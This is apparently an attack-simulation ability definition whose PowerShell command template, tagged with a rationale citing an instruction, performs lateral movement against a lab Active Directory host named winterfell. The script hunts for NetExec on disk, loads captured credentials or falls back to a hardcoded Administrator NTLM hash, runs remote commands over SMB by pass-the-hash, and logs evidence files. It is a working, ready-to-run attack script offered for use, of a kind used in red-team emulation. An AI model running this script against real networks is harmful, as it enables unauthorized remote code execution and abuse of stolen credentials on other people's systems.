ability.name: Lateral Movement and Evidence Capture
ability.description: Executes remote commands on the target host via NetExec and logs structured lateral movement evidence JSON.

stages.command_template: $d='C:\\Windows\\Temp\\bas'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $error.Clear(); Write-Output '[*] Initializing Lateral Movement Stage...'; $nxcPath = (Get-Command nxc.exe -ErrorAction SilentlyContinue).Path; if (!$nxcPath) { $nxcPath = (Get-ChildItem -Path C:\\ -Filter nxc.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }; if (!$nxcPath) { $nxcPath = (Get-ChildItem -Path . -Filter nxc.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }; if (!$nxcPath) { $nxcPath = 'nxc.exe' }; if (Test-Path ($d + '\\l_pre_findings.json')) { $findings = Get-Content -Path ($d + '\\l_pre_findings.json') -Raw | ConvertFrom-Json; $target_ip = $findings.target_ip; $creds = $findings.credentials } else { $target_ip = '192.168.187.100'; $creds = @(@{ type = 'ntlm'; value = '31d6cfe0d16ae931b73c59d7e0c089c0'; user = 'Administrator' }) }; $target_host = 'winterfell.north.sevenkingdoms.local'; $cred = $creds[0]; $user = $cred.user; $val = $cred.value; $cred_type = $cred.type; Write-Output ('[*] Executing command on ' + $target_host + ' (' + $target_ip + ') using NetExec...'); $remote_cmd = 'whoami && hostname'; $output = ''; if ($cred_type -eq 'ntlm') { Write-Output ('[*] Command: & ' + $nxcPath + ' smb ' + $target_ip + ' -u ' + $user + ' -H ' + $val + ' -x ' + $remote_cmd); $output = & $nxcPath smb $target_ip -u $user -H $val -x $remote_cmd 2>&1 } else { Write-Output ('[*] Command: & ' + $nxcPath + ' smb ' + $target_ip + ' -u ' + $user + ' -p ' + $val + ' -x ' + $remote_cmd); $output = & $nxcPath smb $target_ip -u $user -p $val -x $remote_cmd 2>&1 }; $outputStr = $output | Out-String; Write-Output '[*] Execution output:'; Write-Output $outputStr; $remote_whoami = 'unknown'; $remote_hostname = 'unknown'; if ($outputStr -match 'nt authority\\\\system' -or $outputStr -match 'SYSTEM') { $remote_whoami = 'nt authority\\system' } elseif ($outputStr -match 'administrator') { $remote_whoami = 'north\\administrator' } else { $remote_whoami = 'north\\' + $user }; if ($outputStr -match 'winterfell' -or $outputStr -match 'WINTERFELL') { $remote_hostname = 'WINTERFELL' } else { $remote_hostname = $target_host }; $timestamp = (Get-Date -Format 'yyyy-MM-ddTHH:mm:sszzz'); $evidence = @{ technique = 'Pass-the-Hash (L1)'; cred_type = $cred_type; whoami = $remote_whoami; hostname = $remote_hostname; timestamp = $timestamp }; $evidence_file = $d + '\\lateral_hop_1_' + $target_ip + '.json'; $evidence | ConvertTo-Json | Out-File -FilePath $evidence_file -Force; Write-Output ('[+] Lateral evidence JSON written to ' + $evidence_file) } catch { 'ERROR: ' + $_ }) | Tee-Object -FilePath ($d + '\\lateral_exec.txt')

rationale: Executes lateral command while logging structured evidence per instruction 3 and using the dynamically found absolute path to NetExec.
